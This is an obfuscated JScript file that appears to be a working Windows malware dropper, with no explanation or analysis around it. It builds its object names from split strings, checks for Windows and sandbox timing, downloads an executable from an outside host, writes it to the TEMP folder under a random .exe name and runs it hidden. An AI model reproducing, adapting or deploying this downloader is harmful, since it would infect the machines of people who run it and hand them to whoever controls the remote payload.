var S0 = false;
var Q = "Create"+"Object";
var S1 = function T() {return WScript[Q]("WScript"+".Shell");}(), P0 = 11;
var K = "MSXML2"+".XMLHTTP";
var Y = 2;
var L0 = Y - 2;
function YS(WS){S1["Run"](WS, L0, L0);};
function S(){return K + "";};
function U(OD, KY){L0 = L0 * 1; return OD - KY;};
function VY(){return Q;};
/*@cc_on
  @if (@_win32 || @_win64)
    S0 = true;
  @end
@*/
if (S0)
{
var GF = "";
function OX(){return 22;};
var GA = 0; var P = 0;
function F()
{
var DP = new this["Date"]();
var RZ = DP["getUTCMilliseconds"]();
WScript["Sleep"](OX());
var DP = new this["Date"]();
var F0 = DP["getUTCMilliseconds"]();
WScript["Sleep"](OX());
var DP = new this["Date"]();
var RG = DP["getUTCMilliseconds"]();
var GA = "J";
GA = U(F0, RZ);
var P = "LW";
P = U(RG, F0);
GF = "open";
return U(GA, P);
}
var B = false;
var EF = false;
for (var Z = L0; Z < OX() * 1; Z++){if (F() != L0){
B = true; 
P = "31" + 11 * GA + P; 
EF = true; 
break;
}}
function L() {return ((B == true) && (B == EF)) ? 1 : L0;};
if (B && L() && EF){
function SW() {return S1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "XcI0hZE00N1S5.ex" + "e";};
 FI = S();
 K0 = WScript[Q](FI);
 var EC = 1;
do { 
	for (;EC;){
	try {
		if (EC == 1)
		{
			K0[GF]("GET", "http://epegasus.pl/m2osa", false);
			K0["send"]();
			PU = "Sleep";
			EC = 2;
		}
		WScript[PU](OX() + 120); 
		if (K0["readystate"] < 2 * 2) continue;
		EC = L0;
		function R(E) {var T0 = (1, 2, 3, 4, 5, E); return T0;};
		Y0 = WScript[VY()]("ADODB.Stream");
		FI = Y0;
		FI[GF]();
		FI["type"] = R(1);
		FI["write"](K0["ResponseBody"]);
		Y0["position"] = R(L0);
		FI["Save" + "ToFile"](SW(), 2);
		Y0["cl"+"ose"]();
		WI = SW();
		YS(WI);
	} catch(X){};};
}while (EC);
}
}

